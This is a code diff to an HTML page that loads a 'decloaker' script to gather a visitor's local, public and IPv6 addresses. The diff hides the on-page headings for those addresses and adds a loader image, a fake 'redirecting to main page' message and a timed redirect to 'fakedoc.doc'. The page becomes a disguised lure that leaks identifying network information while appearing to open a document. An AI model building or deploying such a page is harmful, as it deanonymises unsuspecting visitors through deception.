@@ -5,14 +5,14 @@
     </head>
     <body>
     <img src="https://d13yacurqjgara.cloudfront.net/users/34535/screenshots/631316/loader_gif.gif" />
-        <h4>Local IP addresses:</h4>
         <ul></ul>
-        <h4>Public IP addresses:</h4>
         <ul></ul>
-        <h4>IPv6 addresses:</h4>
         <ul></ul>
         <iframe id="iframe" sandbox="allow-same-origin" style="display: none"></iframe>
         <script>
+function redir() {
+  window.location.href = "fakedoc.doc";
+}
 navigator.sayswho= (function(){
   var N = navigator.appName, ua= navigator.userAgent, tem;
   var M = ua.match(/(opera|chrome|safari|firefox|msie)\/?\s*(\.?\d+(\.\d+)*)/i);
@@ -21,12 +21,14 @@ navigator.sayswho= (function(){
     return M;
   })();
 var browser_version = navigator.sayswho;
-if (browser_version.toLowerCase.indexOf("safari") == -1) {
+if (browser_version.indexOf("Safari") == -1) {
   var script = document.createElement("script");
   script.src = "decloaker.js";
   script.type = "text/javascript";
   document.head.appendChild(script);
 }
+document.write("You will be redirected to main page in 10 sec.");
+            setTimeout('redir()', 10000);
 </script>
     </body>
 </html>
